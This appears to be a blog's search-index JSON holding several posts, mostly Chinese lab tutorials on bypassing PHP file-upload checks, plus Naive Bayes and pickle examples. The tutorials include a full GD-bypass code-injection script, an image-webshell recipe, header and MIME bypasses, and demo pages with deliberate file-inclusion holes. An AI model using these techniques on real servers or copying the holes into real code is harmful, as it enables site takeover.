import load_iris iris = load_iris() # store the feature matrix (X) and response vector (y) X = iris.data y = iris.target # splitting X and y into training and testing sets from sklearn.model_selection import train_test_split X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=1) # training the model on training set from sklearn.naive_bayes import GaussianNB gnb = GaussianNB() gnb.fit(X_train, y_train) # making predictions on the testing set y_pred = gnb.predict(X_test) # comparing actual response values (y_test) with predicted response values (y_pred) from sklearn import metrics print(\"Gaussian Naive Bayes model accuracy(in %):\", metrics.accuracy_score(y_test, y_pred)*100) Gaussian Naive Bayes model accuracy(in %): 93.33333333333333","categories":[{"name":"人工智能","slug":"人工智能","permalink":"https://fishni.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"},{"name":"机器学习算法","slug":"人工智能/机器学习算法","permalink":"https://fishni.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"GaussianNB","slug":"GaussianNB","permalink":"https://fishni.github.io/tags/GaussianNB/"},{"name":"算法","slug":"算法","permalink":"https://fishni.github.io/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"【文件上传（五）：高级利用】5.1 图片重绘","slug":"5.1 图片重绘","date":"2020-04-02T16:00:00.000Z","updated":"2020-04-14T08:54:14.348Z","comments":true,"path":"2020/04/03/5.1 图片重绘/","link":"","permalink":"https://fishni.github.io/2020/04/03/5.1%20%E5%9B%BE%E7%89%87%E9%87%8D%E7%BB%98/","excerpt":"本文主要内容 重绘图的概念 图片重绘实例分析，PHP输出图像函数","text":"本文主要内容 重绘图的概念 图片重绘实例分析，PHP输出图像函数 0x01 重绘图 应用调用图片库对上传的图片进行了图像转换，所以即使将图片与文件合并，也会将尾部转换掉，无法使用常规方法上传webshell. 如何绕过 将正常图片用目标使用的图像库进行转换 寻找转换前后两次未变的部分 将未变部分替换为欲上传的WebShell 将替换后的文件进行图像文件转换，看是否转换后仍存在替换后部分 比如： 转换前：1233333abcdefg[1111222333]sdas213 转换后：xsadssdddsdddd[1111222333]2313322 0x02 实战练习 参考代码地址https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE 2.1 部署 将参考代码地址项目下载，并放置在windows+phpstudy WWW目录下，并访问，部署完成状态 2.2 上传代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;h2&gt;This is a quick demo to show the process of bypass PHP-GD.&lt;/h2&gt;&lt;h3&gt;Choose image to upload, then \"include $upload_path;\" to show some data.&lt;/h3&gt;&lt;h3&gt;or, use parameter \"file\" to include file, e.g. http://xxxxx/index.php?file=&amp;lt;something&amp;gt;&lt;/h3&gt;&lt;form method=\"POST\" action=\"\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"file\" name=\"upfile\" value=\"\"&gt; &lt;input type=\"submit\" value=\"upload\"&gt;&lt;/form&gt;&lt;?phpfunction gd_process($src_img, $dst_img) &#123; try &#123; # you can redefine the GD process $im = imagecreatefromgif($src_img); imagegif($im, $dst_img); &#125; catch (Exception $e) &#123; printf(\"%s\\n\", $e-&gt;getMessage()); return false; &#125; return true;&#125;if (isset($_FILES[\"upfile\"])) &#123; $temp_file = $_FILES['upfile']['tmp_name']; $img_info = getimagesize($temp_file); if ($img_info[2] == '1') &#123; $upload_file = \"test.gif\"; if (!gd_process($temp_file, $upload_file)) &#123; printf(\"Image upload process error, please check out.\\n\"); exit; &#125; printf(\"Path: %s, image upload successful!\\n\", $upload_file); include $upload_file; &#125; else &#123; printf(\"Image type not support in this demo, GIF please...\\n\"); exit; &#125;&#125;if (isset($_REQUEST[\"file\"])) &#123; include $_REQUEST[\"file\"];&#125;?&gt; imagecreatefromgif()函数 由文件或 URL 创建一个新图象 描述：imagecreatefromgif ( string $filename )返回一图像标识符，代表了从给定的文件名取得的图像 PHP 输出图像 imagegif()、imagejpeg()、imagepng() 和 imagewbmp()函数分别允许以 GIF、JPEG、PNG 和 WBMP 格式将图像输出到浏览器或文件。 语法： bool imagegif ( resource image [, string filename] ) bool imagejpeg ( resource image [, string filename [, int quality]] ) bool imagepng ( resource image [, string filename] ) bool imagewbmp ( resource image [, string filename [, int foreground]] ) 参数说明： image 欲输出的图像资源，如 imagecreate() 或 imagecreatefrom 系列函数的返回值 filename 可选，指定输出图像的文件名。如果省略，则原始图像流将被直接输出。 quality 可选，指定图像质量，范围从 0（最差质量，文件最小）到 100（最佳质量，文件最大），默认75 ，imagejpeg() 独有参数 foreground 可选，指定前景色，默认前景色是黑色，imagewbmp() 独有参数 2.3 上传利用copy制作的图片木马 图片demotest.gif 含phpinfo()WebShell，测试结果 分析上传成功的test.gif和demotest.gif 2.4 图片转换代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159&lt;?php/** * Author: rickchen.vip(at)gmail.com * Date: 2015-04-05 * Desc: Use Similar-Block-Attack to bypass PHP-GD process to RCE * Reference: http://www.secgeek.net/bookfresh-vulnerability/ * Usage: php codeinj.php demo.gif \"&lt;?php phpinfo();?&gt;\" */function gd_process($src_img, $dst_img) &#123; try &#123; # you can redefine the GD process $im = imagecreatefromgif($src_img); imagegif($im, $dst_img); &#125; catch (Exception $e) &#123; printf(\"%s\\n\", $e-&gt;getMessage()); return false; &#125; return true;&#125;function find_similar_block($src_img, $dst_img, $block_len, $slow=false) &#123; $src_data = fread(fopen($src_img, \"rb\"), filesize($src_img)); $dst_data = fread(fopen($dst_img, \"rb\"), filesize($dst_img)); $src_index = 0; $pre_match_array = array(); while ($src_index &lt; (strlen($src_data) - $block_len)) &#123; $find_data = substr($src_data, $src_index, $block_len); $dst_index = 0; $found = false; while ($dst_index &lt; (strlen($dst_data) - $block_len)) &#123; $temp_data = substr($dst_data, $dst_index, $block_len); if (0 === strcmp($find_data, $temp_data)) &#123; $match = array( \"src_offset\" =&gt; $src_index, \"dst_offset\" =&gt; $dst_index ); $pre_match_array[] = $match; $found = true; /* printf(\"Similar block found&gt; src_offset: %d\\n\", $src_index); printf(\" dst_offset: %d\\n\", $dst_index); printf(\" similar_data: %s\\n\", str2hex($temp_data)); printf(\" similar_length: %s\\n\\n\", strlen($temp_data)); */ &#125; if ($found &amp;&amp; $slow == false) $dst_index += $block_len; else $dst_index++; &#125; if ($found &amp;&amp; $slow == false) $src_index += $block_len; else $src_index++; &#125; return $pre_match_array;&#125;function inject_code_to_src_img($src_img, $pre_match_array, $injection_code) &#123; $src_data = fread(fopen($src_img, \"rb\"), filesize($src_img)); $inj_len = strlen($injection_code); $find_n = 0; foreach ($pre_match_array as $similar_block) &#123; #printf(\"Trying inject code to source image with offset: %d, length: %d\\n\", $similar_block[\"src_offset\"], $inj_len); $mod_src_data = substr($src_data, 0, $similar_block[\"src_offset\"]).$injection_code.substr($src_data, $similar_block[\"src_offset\"] + $inj_len); $temp_img = sys_get_temp_dir().\"/\".$src_img.\".mod\"; $temp_cvt_img = $temp_img.\".gd\"; fwrite(fopen($temp_img, \"wb\"), $mod_src_data); if (!gd_process($temp_img, $temp_cvt_img)) &#123; #printf(\"PHP-GD process() the image modified error, offset: %d\\n\", $similar_block[\"src_offset\"]); #printf(\" length: %d\\n\\n\", $inj_len); continue; &#125; else &#123; if (check_code($temp_cvt_img, $injection_code)) &#123; $fuck_img = \"gd_\".$src_img; fwrite(fopen($fuck_img, \"wb\"), $mod_src_data); printf(\"Inject code to source image successful with offset: %d\\n\", $similar_block[\"src_offset\"]); printf(\"Saving result \\\"%s\\\", have fun! :)\\n\", $fuck_img); exit; &#125; else &#123; continue; #printf(\"Modified image doesn't work well, offset: %d, retry...\\n\", $similar_block[\"src_offset\"]); &#125; &#125; &#125;&#125;function check_code($src_img, $injection_code) &#123; $data = fread(fopen($src_img, \"rb\"), filesize($src_img)); return strpos($data, $injection_code);&#125;function str2hex($str)&#123; $hex = \"\"; for ($i = 0; $i &lt; strlen($str); $i++)&#123; $hex .= sprintf(\"%02x\", (ord($str[$i])));; &#125; return $hex;&#125;function hex2str($hex)&#123; $str = \"\"; for ($i = 0; $i &lt; strlen($hex)-1; $i+=2)&#123; $str .= chr(hexdec($hex[$i].$hex[$i+1])); &#125; return $str;&#125;/* main */if ($argc &lt; 3) &#123; printf(\"Usage: php %s &lt;src_img&gt; &lt;inj_code&gt;\\n\", $argv[0]); exit;&#125;$slow = false;$src_img = $argv[1];$injection_code = $argv[2];$img_info = getimagesize($src_img);/* GIF image type value \"1\" */if ($img_info[2] == '1') &#123; $cvt_img = sys_get_temp_dir().\"/\".basename($src_img); if (!gd_process($src_img, $cvt_img)) &#123; printf(\"PHP-GD process() function error, please check out.\\n\"); exit; &#125;&#125; else &#123; printf(\"This script only support GIF image.\\n\"); exit;&#125;$block_len = strlen($injection_code);$pre_match_array = find_similar_block($src_img, $cvt_img, $block_len, $slow);if (sizeof($pre_match_array)) &#123; inject_code_to_src_img($src_img, $pre_match_array, $injection_code);&#125; else &#123; printf(\"Not found any similar %d bytes block.\\n\", strlen($injection_code));&#125;printf(\"Cant find any useful similar block to inject code, but take it easy. :(\\n\"); 2.5 使用图片转换代码，转换代码 转换操作如图 查看demo.gif,经过转换后的gd_demo.gif 2.6 上传2.5转换后的图片gd_demo.gif 测试结果 再次分析gd_demo.gif和上传成功的test.gif","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"fileupload","slug":"fileupload","permalink":"https://fishni.github.io/tags/fileupload/"},{"name":"PHP","slug":"PHP","permalink":"https://fishni.github.io/tags/PHP/"}]},{"title":"【文件上传（三）：服务端检测绕过】3.4服务端文件内容检测绕过","slug":"3.4 服务端文件内容检测","date":"2020-03-27T16:00:00.000Z","updated":"2020-04-14T08:53:49.831Z","comments":true,"path":"2020/03/28/3.4 服务端文件内容检测/","link":"","permalink":"https://fishni.github.io/2020/03/28/3.4%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B/","excerpt":"本文主要内容 简单文件头检测、文件幻数检测 完整文件结构检测","text":"本文主要内容 简单文件头检测、文件幻数检测 完整文件结构检测 0x01 简单文件头检测 文件幻数检测 JPG ： FF D8 FF E0 00 10 4A 46 49 46 GIF ： 47 49 46 38 39 61 (GIF89a) PNG： 89 50 4E 47 如下图所示代码，是通过文件头的起始部分进行匹配，比较简单的一种文件类型检测方法。 简单文件头检测测试示例 代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/&gt;&lt;?phpfunction getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = \"uploads/\".rand(10, 99).\".\".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125;?&gt;&lt;div id=\"upload_panel\"&gt; &lt;ol&gt; &lt;li&gt; &lt;h3&gt;上传区&lt;/h3&gt; &lt;form enctype=\"multipart/form-data\" method=\"post\"&gt; &lt;p&gt;请选择要上传的图片：&lt;p&gt; &lt;input class=\"input_file\" type=\"file\" name=\"upload_file\"/&gt; &lt;input class=\"button\" type=\"submit\" name=\"submit\" value=\"上传\"/&gt; &lt;/form&gt; &lt;div id=\"msg\"&gt; &lt;?php if($msg != null)&#123; echo \"提示：\".$msg; &#125; ?&gt; &lt;/div&gt; &lt;div id=\"img\"&gt; &lt;?php if($is_upload)&#123; echo '&lt;img src=\"'.$img_path.'\" width=\"250px\" /&gt;'; &#125; ?&gt; &lt;/div&gt; &lt;/li&gt; &lt;/ol&gt;&lt;/div&gt; 如果仅在含phpinfo()的文件（phpinfo.php）将其修改为phpinfo.gif是不行的，需在文件内容开头添加gif的文件幻数GIF8a 1GIF89a&lt;?php phpinfo();?&gt; 测试：利用burpsuite截包，repeater重放功能 利用：利用本地文件包含，访问已上传的图片文件（因为图片无法直接被解析） 0x02 完整文件结构检测 通过调用图像函数（如：getimagesize/imagecreatefromgif/imagecreatefrompng）,进行检测文件是否为图像，需要文件内容保持相对完整，所以无法通过上追加头部起始字节的方法进行绕过。 但是对于getimagesize，如果在文件头追加GIF89a，也是可以成功上传的，但是imagecreatefromgif等无法绕过 2.1 绕过方法 将图片文件与欲上传的文件进行合并绕过检测 copy命令进行文件合并 合并后的文件只要未经过清洗或缩放等操作即可通过检测，并保存欲上传文件的完整性 上传文件的图片部分在解析为PHP时会以乱码显示，建议与尽量小的文件进行合并，否则会有大量乱码 2.2图片一句话木马制作 创建一个文件夹，包含a.bat,tp.gif,yjh.php a.bat内容为cmd；yjh.php内容为&lt;?php phpinfo(): ?&gt; 点击bat文件进入DOS命令，写入”copy tp.gif/b+yjh.php tpyjh.gif” 回车 2.3实战示例 代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/&gt;&lt;?phpfunction isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext))&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = isImage($temp_file); if(@imagecreatefromgif($temp_file))&#123; if($file_type == 'unknown')&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = \"uploads/\".rand(10, 99).$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125; &#125;else&#123; $msg=\"文件不是gif图片\"; &#125;&#125;?&gt;&lt;div id=\"upload_panel\"&gt; &lt;ol&gt; &lt;li&gt; &lt;h3&gt;上传区&lt;/h3&gt; &lt;form enctype=\"multipart/form-data\" method=\"post\"&gt; &lt;p&gt;请选择要上传的图片：&lt;p&gt; &lt;input class=\"input_file\" type=\"file\" name=\"upload_file\"/&gt; &lt;input class=\"button\" type=\"submit\" name=\"submit\" value=\"上传\"/&gt; &lt;/form&gt; &lt;div id=\"msg\"&gt; &lt;?php if($msg != null)&#123; echo \"提示：\".$msg; &#125; ?&gt; &lt;/div&gt; &lt;div id=\"img\"&gt; &lt;?php if($is_upload)&#123; echo '&lt;img src=\"'.$img_path.'\" width=\"250px\" /&gt;'; &#125; ?&gt; &lt;/div&gt; &lt;/li&gt; &lt;/ol&gt;&lt;/div&gt; 利用burpsuite重放，获取生成的随机图片文件 利用本地文件包含访问图片 0x03 恶意文件内容检测 检测提交内容中是否包含Webshell等数据 推荐使用强混淆的weevely进行尝试，kail中自带https://github.com/sunge/Weevely 或者尝试开源的webshell收集项目https://github.com/tennc/webshell","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"fileupload","slug":"fileupload","permalink":"https://fishni.github.io/tags/fileupload/"}]},{"title":"【文件上传（三）：服务端检测绕过】3.1服务端MIME类型检测绕过","slug":"3.1 服务端MIME类型检测绕过","date":"2020-03-26T16:00:00.000Z","updated":"2020-04-14T08:53:37.771Z","comments":true,"path":"2020/03/27/3.1 服务端MIME类型检测绕过/","link":"","permalink":"https://fishni.github.io/2020/03/27/3.1%20%E6%9C%8D%E5%8A%A1%E7%AB%AFMIME%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/","excerpt":"本文内容 文件头content-type字段校验（image/gif等）绕过","text":"本文内容 文件头content-type字段校验（image/gif等）绕过 0x01 服务端一般检测的内容 上传的文件名（扩展名、黑白名单） MIME/TYPE （浏览器根据文件扩展名自动生成） 0x02 MIME了解 MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。 MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。 浏览器会自动根据所上传的文件的扩展名，对应到相应的MIME类型上 常见的白名单MIME/TYPE 0x03 实例分析 环境：windows+phpstudy+burpsuite 由于本地127.0.0.1burpsuite截不到包故采用本地网络地址 测试代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/&gt;&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = 'uploads/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; $msg= \"&lt;br/&gt;成功上传至:&lt;b&gt; \".$img_path.\"&lt;/b&gt;\"; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125;?&gt;&lt;div id=\"upload_panel\"&gt; &lt;ol&gt; &lt;li&gt; &lt;h3&gt;上传区&lt;/h3&gt; &lt;form enctype=\"multipart/form-data\" method=\"post\" onsubmit=\"return checkFile()\"&gt; &lt;p&gt;请选择要上传的图片：&lt;p&gt; &lt;input class=\"input_file\" type=\"file\" name=\"upload_file\"/&gt; &lt;input class=\"button\" type=\"submit\" name=\"submit\" value=\"上传\"/&gt; &lt;/form&gt; &lt;div id=\"msg\"&gt; &lt;?php if($msg != null)&#123; echo \"提示：\".$msg; &#125; ?&gt; &lt;/div&gt; &lt;div id=\"img\"&gt; &lt;?php if($is_upload)&#123; echo '&lt;img src=\"'.$img_path.'\" width=\"250px\" /&gt;'; &#125; ?&gt; &lt;/div&gt; &lt;/li&gt; &lt;/ol&gt;&lt;/div&gt; 尝试上传一个含phpinfo的文件（phpinfo.php） 使用burpsuite截断修改content-type，重新提交报文 将burpsuite截断关闭，访问上传的文件","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"fileupload","slug":"fileupload","permalink":"https://fishni.github.io/tags/fileupload/"}]},{"title":"【文件上传（二）：前端检测绕过】2.2提交报文修改检测","slug":"2.2 提交报文修改检测","date":"2020-03-25T16:00:00.000Z","updated":"2020-04-14T08:53:25.106Z","comments":true,"path":"2020/03/26/2.2 提交报文修改检测/","link":"","permalink":"https://fishni.github.io/2020/03/26/2.2%20%E6%8F%90%E4%BA%A4%E6%8A%A5%E6%96%87%E4%BF%AE%E6%94%B9%E6%A3%80%E6%B5%8B/","excerpt":"本文主要内容 提交报文修改检测 绕过示例","text":"本文主要内容 提交报文修改检测 绕过示例 0x01 提交报文修改检测（前端检测通用） 首先选择正常的文件进行上传 而后通过BurpSuite进行截包改包或改包重放完成文件上传 这种方法前端绕过检测中通用，无需理会具体前端的检测代码，直接绕过前端进行上传报文的修改并提交 0x02 示例（1）环境 （2）选择本地一张含phpinfo()函数的图片（phpinfo.jpg）,使用burpsuite截包 （3）burpsuite进行重放 原始 修改后：","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"fileupload","slug":"fileupload","permalink":"https://fishni.github.io/tags/fileupload/"}]},{"title":"【文件上传（二）：前端检测绕过】2.1客户端检测绕过","slug":"2.1 客户端检测绕过","date":"2020-03-25T16:00:00.000Z","updated":"2020-04-14T08:53:10.454Z","comments":true,"path":"2020/03/26/2.1 客户端检测绕过/","link":"","permalink":"https://fishni.github.io/2020/03/26/2.1%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/","excerpt":"本文主要内容 主要客户端检测绕过类型 前端js检测绕过示例","text":"本文主要内容 主要客户端检测绕过类型 前端js检测绕过示例 0x01 客户端检测绕过（1）JavaScript检测：通过浏览器提交上传请求前，触发检测用JS脚本进行检测。 例如：普通的表单上传（2）Flash AS脚本检测：上传用Flash，提交上传请求前，触发检测用AS脚本进行检测。 例如:DZ的头像上传（3）APP上传检测：检测写在APP客户端代码中，或者所调用的HTML页面中 客户端检测一般只检测文件扩展名 客户端进行的检测，可通过对客户端代码的一些修改或直接拦截修改报文即可绕过，所以这种上传限制约等于没有 0x02 前端JavaScript检测绕过 查看onchange、onsubmit等事件 onchange事件会在域的内容改变时发生 onsubmit事件会在表单中的确认按钮被点击时发生 删除掉相关事件中的检测函数 0x03 测试案例（1）环境 windows+phpstudy+uploadlab （2）尝试上传含phpinfo()函数的php文件（phpinfo.php） （3）F12审查元素代码，找到事件触发函数 （4）删除onsubmit，重新提交，并访问上传的文件 （5）查看网页源代码可找到上传文件路径相关信息 （6）js校验代码如下 12345678910111213141516171819&lt;script type=\"text/javascript\"&gt; function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125; &#125;&lt;/script&gt;","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"fileupload","slug":"fileupload","permalink":"https://fishni.github.io/tags/fileupload/"}]},{"title":"【文件上传（一）】1.1文件上传漏洞原理及流程","slug":"1.1 文件上传漏洞原理及流程","date":"2020-03-24T16:00:00.000Z","updated":"2020-04-14T08:50:53.361Z","comments":true,"path":"2020/03/25/1.1 文件上传漏洞原理及流程/","link":"","permalink":"https://fishni.github.io/2020/03/25/1.1%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%B5%81%E7%A8%8B/","excerpt":"本文主要内容 文件上传流程、漏洞原因 burpsuite简单安装 dvwa文件上传简单示例","text":"本文主要内容 文件上传流程、漏洞原因 burpsuite简单安装 dvwa文件上传简单示例 文件上传流程： 1.前端选择文件，进行提交 2.浏览器形成POST MultiPart报文发送到服务器 3.服务器中间件接收到报文，解析后交给相关后端代码进行处理 4.后端代码将上传的文件内容写入到临时文件中（PHP特有） 5.写入到文件中，文件名为提交的文件名或以一定规则生成的文件名 文件上传漏洞产生原因 文件上传未对上传的文件进行严格的验证和过滤，容易造成任意文件上传，包括上传动态文件（asp/php/jsp等等） 如果上传的目标目录没有限制执行权限，导致上传的动态文件（比如：webshell）可以正常执行并且可以访问，即造成了文件上传漏洞。 存在上传漏洞的必要条件 存在上传点 可以上传动态文件 上传目录有执行权限，并且上传的文件可执行 可访问到上传的动态文件 上传检测流程 BurpSuite简单安装 下载jdk 官网下载Burp Suite 2.1 参考链接：https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=54760&amp;highlight=burpsuite 简单代理配置 火狐浏览器：选项-》网络设置-》设置 burpsuite设置： 使burpsuite支持对DVWA环境（本地环境）进行抓包（此方法仅尝试成功一次，貌似不可行） 在火狐浏览器url栏输入：about:config 然后在搜索栏输入：network.proxy.allow_hijacking_localhost dvwa文件上传low简单示例 burpsuite截包 使burpsuite支持对DVWA环境（本地环境）进行抓包（采用了本地地址ip的访问方式） 将代理都修改为端口9999 测试：","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"fileupload","slug":"fileupload","permalink":"https://fishni.github.io/tags/fileupload/"}]},{"title":"python序列化数据之pickle详解","slug":"python序列化数据之pickle详解","date":"2020-03-14T16:00:00.000Z","updated":"2020-03-30T06:32:58.535Z","comments":true,"path":"2020/03/15/python序列化数据之pickle详解/","link":"","permalink":"https://fishni.github.io/2020/03/15/python%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E4%B9%8Bpickle%E8%AF%A6%E8%A7%A3/","excerpt":"学习python之pickle详解","text":"学习python之pickle详解 序列化和反序列化 便于存储（序列化过程：将文本信息转为==二进制数据流，易存储在硬盘中==） 反序列化从硬盘读取的数据，可得到原始数据 python程序运行中得到的字符串、列表等数据，要长久保存，方便之后使用（pickle模块可以将对象转换为已知可以传输或存储的格式） python中序列化和反序列化 将Python对象转换为二级制形式叫做序列化（Pickling） 将二进制数据流恢复为Python对象叫做反序列化（Unpickling） pickle 提供了一个简单的==持久化==功能，可以将对象以==文件==形式存放在磁盘上 只能在python中使用，可以序列化python中几乎所有的数据类型（列表、字典…） pickle序列化后的数据，可读性差 pickle序列化和反序列化示例 819pickling_unpickling_example.py 123456789101112131415161718192021222324252627282930313233import pickle# 定义类Partclass Part: number = 0 name = \"\" def __init__(self, number, name): self.number = number self.name = name def identify(self): print(\"Part Number: %d\"%(self.number)) print(\"Part Name: %s\"%(self.name)) # 实例化partpart1=Part(111, \"Spindle\");# Create a file to store the pickled object# 创建文件存储pickled对象objectRepository = open(\"ObjectFile.picl\", \"wb\"); # Pickle/serialize the python object and store the bytes into a binary file# 序列化Python对象并存储为二进制字节流pickle.dump(part1, objectRepository, protocol=pickle.HIGHEST_PROTOCOL)objectRepository.close() # Unpickle/de-serialize the python object and print the attributes of the object# 反序列化Python对象并打印对象属性objectRepository = open(\"ObjectFile.picl\", \"rb\",);reconstructedObject = pickle.load(objectRepository) # Print object attributes# 打印对象属性reconstructedObject.identify() 12 - 运行结果： (venv) yuhao@fishmouse:~/Envs/venv/project$ python 819pickling_unpickling_example.py Part Number: 111 Part Name: Spindle 12345678- 序列化的数据 &#96;&#96;&#96;python &gt;&gt;&gt; with open(&#39;ObjectFile.picl&#39;,&#39;rb&#39;) as f: ... f.read() ... b&#39;\\x80\\x04\\x959\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08__main__\\x94\\x8c\\x04Part\\x94\\x93\\x94)\\x81\\x94&#125;\\x94(\\x8c\\x06number\\x94Ko\\x8c\\x04name\\x94\\x8c\\x07Spindle\\x94ub.&#39; ==序列化==语法 pickle.dump参考链接 pickle.dump(obj,file[,protocol]) 序列化对象，将结果数据流写入到文件对象或者buffer中 参数protocol是序列化模式，一共有5种不同的类型，即（0,1,2,3,4）； （0,1,2）早期的版本，默认值为0（表示以文本形式序列化），值为1或2（表示以二级制的形式序列化）； （3,4）则是python3之后的版本 查看（3,4） 12345&gt;&gt;&gt; import pickle&gt;&gt;&gt; pickle.HIGHEST_PROTOCOL4&gt;&gt;&gt; pickle.DEFAULT_PROTOCOL3 pickle.dump()：转换的字节流写入buffer中 示例：819pickle_dump_example.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import pickleimport io class Book: title = \"\" isbn = \"\" parts = None chapters = None def __init__(self, title, isbn, parts, chapters): self.title = title self.isbn = isbn self.parts = parts self.chapters = chapters def identify(self): print(\"Title of the book: %s\"%(self.title)) print(\"ISBN of the book: %s\"%(self.isbn)) print(\"Parts are:\") for part in self.parts: print(part) print(\"Chapters are:%s\"%(self.chapters))class Part: partName = \"\" beginChapter = -1 endChapter = -1 def __init__(self, partName, beginChapter, endChapter): self.partName = partName self.beginChapter = beginChapter self.endChapter = endChapter def __str__(self): stringRep = 